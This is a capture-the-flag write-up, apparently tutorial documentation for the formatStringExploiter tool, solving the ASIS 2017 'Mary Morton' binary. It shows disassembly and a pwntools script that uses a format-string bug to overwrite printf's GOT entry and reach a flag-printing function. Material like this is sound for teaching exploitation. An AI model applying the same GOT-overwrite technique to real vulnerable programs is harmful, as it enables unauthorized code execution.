#############################
ASIS Finals 2017: Mary Morton
#############################

********
Overview
********
The Mary Morton ASIS challenge was designed to be simple. In doing so, they
provide the CTFer with two options. The first, a stack overflow. The second, a
format string vulnerability. While my guess is the intended solution was to use
the format string vulnerability to leak the stack canary so that you could use
the buffer overflow, ``formatStringExploiter`` makes using only the format string
vulnerability for a win very easy. In this case, I only used the format string
vulnerability and a couple lines of python to solve it.

Example::

    $ ./mary_morton
    Welcome to the battle ! 
    [Great Fairy] level pwned 
    Select your weapon 
    1. Stack Bufferoverflow Bug 
    2. Format String Bug 
    3. Exit the battle 
    2
    %x
    224dc6b0
    1. Stack Bufferoverflow Bug 
    2. Format String Bug 
    3. Exit the battle 
    1
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

    *** stack smashing detected ***: ./mary_morton terminated
    Aborted (core dumped)


*****************
The Vulnerability
*****************
As stated before, the user is allowed to chose a vulnerability they wish to use
and then use it in a strait forward manner. Using ``checksec``, we notice that
this binary is 64-bit and utilizes partial relro. This means that we have the
ability to overwrite the ``GOT`` table. Further, since hardening techniques have
not been enabled, we are able to use ``%n``, which is key for enabling format
string to overwrite the ``GOT`` entry.

The next question is generally, what do I overwrite and what do i overwrite
that with? Well, a look at the strings of this binary provides a good target.::

    [0x00400960]> iz
    vaddr=0x00400ad4 paddr=0x00000ad4 ordinal=000 sz=25 len=24 section=.rodata type=ascii string=Welcome to the battle !
    vaddr=0x00400aed paddr=0x00000aed ordinal=001 sz=27 len=26 section=.rodata type=ascii string=[Great Fairy] level pwned
    vaddr=0x00400b08 paddr=0x00000b08 ordinal=002 sz=20 len=19 section=.rodata type=ascii string=Select your weapon
    vaddr=0x00400b1f paddr=0x00000b1f ordinal=003 sz=5 len=4 section=.rodata type=ascii string=Bye
    vaddr=0x00400b24 paddr=0x00000b24 ordinal=004 sz=7 len=6 section=.rodata type=ascii string=Wrong!
    vaddr=0x00400b2b paddr=0x00000b2b ordinal=005 sz=16 len=15 section=.rodata type=ascii string=/bin/cat ./flag
    vaddr=0x00400b3b paddr=0x00000b3b ordinal=006 sz=7 len=6 section=.rodata type=ascii string=-> %s\n
    vaddr=0x00400b42 paddr=0x00000b42 ordinal=007 sz=29 len=28 section=.rodata type=ascii string=1. Stack Bufferoverflow Bug
    vaddr=0x00400b5f paddr=0x00000b5f ordinal=008 sz=22 len=21 section=.rodata type=ascii string=2. Format String Bug
    vaddr=0x00400b75 paddr=0x00000b75 ordinal=009 sz=20 len=19 section=.rodata type=ascii string=3. Exit the battle

So "/bin/cat ./flag" seems like something we want to do. Let's find the code.::

    [0x004008da]> /r 0x00400b2b
    [0x00400c98-0x0060109f] data 0x4008de mov edi, str._bin_cat_._flag in fcn.004008da

Going back a little, we find the hidden function.::

    │           0x004008da      55             push rbp
    │           0x004008db      4889e5         mov rbp, rsp
    │           0x004008de      bf2b0b4000     mov edi, str._bin_cat_._flag ; 0x400b2b ; "/bin/cat ./flag"
    │           0x004008e3      e8b8fdffff     call sym.imp.system         ; int system(const char *string)
    │           0x004008e8      90             nop
    │           0x004008e9      5d             pop rbp
    └           0x004008ea      c3             ret

So we can probably agree that ``0x004008da`` is our target for this overwrite.


****************
Step 1: exec_fmt 
****************
The first step in using the ``FormatString`` class is to create an exec_fmt
function. This function will take in any arbitrary input, pass that input into
the application properly, parse the results and return the results back. At
this point, we're not worried about exploiting the vulnerability, we're simply
interacting with the program.

.. code-block:: python

    def exec_fmt(s):
        p.sendline("2")
        sleep(0.1)
        p.sendline(s)
        ret = p.recvuntil("1. Stack Bufferoverflow Bug",drop=True)
        p.recvuntil("Exit the battle \n")
        return ret


*************************
Step 2: Instantiate Class
*************************
Next, we need to instantiate a FormatString class. This can be done strait
forward. To make it simpler, we'll also open an ``ELF`` class on the exe.

.. code-block:: python

  from formatStringExploiter.FormatString import FormatString
  from pwn import *
  
  # Load the binary in pwntools. This way we don't need to worry about the
  # details, just pass it to FormatString
  elf = ELF("./mary_morton")
  
  # Now, instantiate a FormatString class, using the elf and exec_fmt functions
  fmtStr = FormatString(exec_fmt,elf=elf)

You will see some data scroll. This is the FormatString class attempting to
discover your buffer for you. Finally, you'll see something like this::

  Found the offset to our input! Index = 6, Pad = 0

Good to go now. It has found the buffer, we can simply ask the class to perform
actions for us now. However, let's make this a little faster. The challenge
binary has a 20 second timeout. We don't want to waste time finding the same
index and exploring the stack each time. Thus, since we already know the index,
let's just tell ``formatStringExploiter`` what it is ahead of time. The above
code simply becomes:

.. code-block:: python

  from formatStringExploiter.FormatString import FormatString
  from pwn import *
  
  # Load the binary in pwntools. This way we don't need to worry about the
  # details, just pass it to FormatString
  elf = ELF("./mary_morton")
  
  # Now, instantiate a FormatString class, using the elf and exec_fmt functions
  fmtStr = FormatString(exec_fmt,elf=elf,index=6,pad=0,explore_stack=False)

Now, our load time for this will be effectively none.


*********************
Step 3: Read the flag
*********************
We now have a functional and initialize ``FormatString`` class. We also know
what function we want to call. Lets pick some function to overwrite. Since our
target function doesn't take input, it could be almost anything. We'll just
choose ``printf`` for the sake of simplicity. Our exploit then, looks like this:

.. code-block:: python

    # The function that prints the flag
    winner = 0x4008DA

    # Connect up
    connect()

    # Instantiate the format string with known values
    fmtStr = FormatString(exec_fmt,elf=elf,index=6,pad=0,explore_stack=False)

    # Ask our format string to overwrite the printf GOT entry with our function
    fmtStr.write_q(elf.symbols['got.printf'], winner)

    # Hit enter and our flag should be printed out.
    p.sendline("2")
    p.interactive()

    # ASIS{An_impROv3d_v3r_0f_f41rY_iN_fairy_lAnds!}


That's it. Your flag is printed. If this were the CTF, you could change
``process`` to ``remote`` and run it again to grab the flag.

*********
Resources
*********
* `mary_morton <https://github.com/BannSec/formatStringExploiter/blob/master/docs/examples/mary_morton?raw=true>`_
* `mary_morton.py <https://raw.githubusercontent.com/BannSec/formatStringExploiter/master/docs/examples/mary_morton.py>`_
